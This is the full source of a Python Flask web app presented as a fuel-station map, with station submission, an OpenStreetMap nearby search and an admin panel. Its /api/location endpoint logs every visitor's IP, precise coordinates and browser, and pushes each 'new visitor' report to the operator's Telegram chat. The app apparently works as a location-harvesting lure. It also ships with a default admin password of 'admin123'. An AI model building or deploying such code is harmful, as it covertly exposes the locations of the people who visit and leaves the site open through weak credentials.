import os, sqlite3, requests
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "change-me-in-production")
DB = os.getenv("DB_PATH", "gas.db")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

def db():
    con = sqlite3.connect(DB)
    con.row_factory = sqlite3.Row
    return con

def init_db():
    con = db()
    con.executescript("""
    CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        created_at TEXT NOT NULL,
        ip TEXT,
        lat REAL,
        lon REAL,
        user_agent TEXT
    );
    CREATE TABLE IF NOT EXISTS places (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        lat REAL NOT NULL,
        lon REAL NOT NULL,
        address TEXT,
        fuel TEXT,
        created_at TEXT NOT NULL,
        approved INTEGER NOT NULL DEFAULT 0
    );
    """)
    con.commit()
    con.close()

def now():
    return datetime.now(timezone.utc).isoformat()

def notify_telegram(text):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text},
            timeout=8
        )
    except requests.RequestException:
        pass

def admin_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if not session.get("admin"):
            return redirect(url_for("admin_login"))
        return fn(*args, **kwargs)
    return wrapper

@app.get("/")
def index():
    return render_template("index.html")

@app.post("/api/location")
def location():
    data = request.get_json(silent=True) or {}
    lat, lon = data.get("lat"), data.get("lon")
    if not isinstance(lat, (int, float)) or not isinstance(lon, (int, float)):
        return jsonify({"ok": False, "error": "invalid_coordinates"}), 400

    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    con = db()
    con.execute(
        "INSERT INTO visits(created_at,ip,lat,lon,user_agent) VALUES(?,?,?,?,?)",
        (now(), ip, lat, lon, ua[:500])
    )
    con.commit()
    con.close()

    notify_telegram(
        "📍 Новый посетитель\n"
        f"Время: {now()}\n"
        f"IP: {ip}\n"
        f"Геолокация: {lat:.6f}, {lon:.6f}\n"
        f"UA: {ua[:200]}"
    )
    return jsonify({"ok": True})

@app.get("/api/places")
def places():
    con = db()
    rows = con.execute(
        "SELECT id,name,lat,lon,address,fuel FROM places WHERE approved=1 ORDER BY id DESC"
    ).fetchall()
    con.close()
    return jsonify([dict(x) for x in rows])

@app.post("/api/places")
def add_place():
    data = request.get_json(silent=True) or {}
    name = str(data.get("name", "")).strip()
    address = str(data.get("address", "")).strip()
    fuel = str(data.get("fuel", "")).strip()
    lat, lon = data.get("lat"), data.get("lon")

    if not name or not isinstance(lat, (int,float)) or not isinstance(lon, (int,float)):
        return jsonify({"ok": False, "error": "Заполни название и координаты"}), 400

    con = db()
    con.execute(
        "INSERT INTO places(name,lat,lon,address,fuel,created_at,approved) VALUES(?,?,?,?,?,?,0)",
        (name, lat, lon, address[:300], fuel[:200], now())
    )
    con.commit()
    con.close()
    notify_telegram(f"⛽ Новая заявка на заправку: {name}\nКоординаты: {lat}, {lon}\nАдрес: {address}")
    return jsonify({"ok": True, "message": "Место отправлено на модерацию"})

@app.post("/api/nearby")
def nearby():
    data = request.get_json(silent=True) or {}
    lat, lon = data.get("lat"), data.get("lon")
    if not isinstance(lat, (int,float)) or not isinstance(lon, (int,float)):
        return jsonify({"ok": False}), 400

    # OpenStreetMap Overpass: real-world fuel stations near the user.
    query = f"""[out:json][timeout:15];
    (
      nwr["amenity"="fuel"](around:10000,{lat},{lon});
    );
    out center tags;"""
    try:
        r = requests.post("https://overpass-api.de/api/interpreter",
                          data=query, timeout=20)
        r.raise_for_status()
        out = []
        for el in r.json().get("elements", []):
            tags = el.get("tags", {})
            p_lat = el.get("lat", el.get("center", {}).get("lat"))
            p_lon = el.get("lon", el.get("center", {}).get("lon"))
            if p_lat is None or p_lon is None:
                continue
            out.append({
                "name": tags.get("name") or "АЗС",
                "lat": p_lat, "lon": p_lon,
                "address": ", ".join(filter(None, [
                    tags.get("addr:street"),
                    tags.get("addr:housenumber"),
                    tags.get("addr:city")
                ])),
                "fuel": tags.get("fuel:octane_95", "")
            })
        return jsonify({"ok": True, "places": out})
    except requests.RequestException:
        return jsonify({"ok": False, "error": "Не удалось получить данные карт"}), 502

@app.get("/admin/login")
def admin_login():
    return render_template("login.html")

@app.post("/admin/login")
def admin_login_post():
    if request.form.get("password") == ADMIN_PASSWORD:
        session["admin"] = True
        return redirect(url_for("admin"))
    return render_template("login.html", error="Неверный пароль"), 401

@app.get("/admin/logout")
def admin_logout():
    session.clear()
    return redirect(url_for("admin_login"))

@app.get("/admin")
@admin_required
def admin():
    con = db()
    visits = con.execute("SELECT * FROM visits ORDER BY id DESC LIMIT 100").fetchall()
    pending = con.execute("SELECT * FROM places WHERE approved=0 ORDER BY id DESC").fetchall()
    approved = con.execute("SELECT * FROM places WHERE approved=1 ORDER BY id DESC").fetchall()
    total = con.execute("SELECT COUNT(*) c FROM visits").fetchone()["c"]
    con.close()
    return render_template("admin.html", visits=visits, pending=pending, approved=approved, total=total)

@app.post("/admin/places/<int:place_id>/approve")
@admin_required
def approve(place_id):
    con = db()
    con.execute("UPDATE places SET approved=1 WHERE id=?", (place_id,))
    con.commit(); con.close()
    return redirect(url_for("admin"))

@app.post("/admin/places/<int:place_id>/delete")
@admin_required
def delete_place(place_id):
    con = db()
    con.execute("DELETE FROM places WHERE id=?", (place_id,))
    con.commit(); con.close()
    return redirect(url_for("admin"))

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5000")))
